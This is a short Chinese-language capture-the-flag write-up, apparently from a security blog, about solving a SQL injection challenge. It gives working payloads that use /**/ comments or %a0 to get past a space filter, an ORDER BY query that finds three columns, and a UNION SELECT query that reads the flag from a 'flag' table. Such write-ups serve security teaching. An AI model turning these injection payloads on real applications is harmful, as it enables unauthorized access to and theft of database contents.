映入眼帘的是![1621860284_60ab9fbc6d7d65a5de710.png!small](https://image.3001.net/images/20210524/1621860284_60ab9fbc6d7d65a5de710.png!small)

告诉了我们flag在 **flag表里的flag字段**

在框里 **输入数字** 有 **回显**

![1621860665_60aba139a844128cfc8a3.png!small](https://image.3001.net/images/20210524/1621860665_60aba139a844128cfc8a3.png!small)

说明用户输入的数据被当做 **sql代码** 执行了

说明这里存在 **sql注入**

页面显示 hacker!

说明 **空格** 被过滤了

sql注入绕过** **空格** **的方法

    
    
    注释符/**/，%a0      

**sql注入绕过技巧推荐:**<https://www.cnblogs.com/Vinson404/p/7253255.html>

判断当前页面的 **字段数**

    
    
    1'/**/order/**/by/**/1,2,3,4.....

经测试 **字段数为3**

然后 **联合查询** 注入得flag

    
    
    -1'union/**/select/**/1,2,flag/**/from/**/flag#

![1621939518_60acd53ee79bfe5706343.png!small](https://image.3001.net/images/20210525/1621939518_60acd53ee79bfe5706343.png!small)

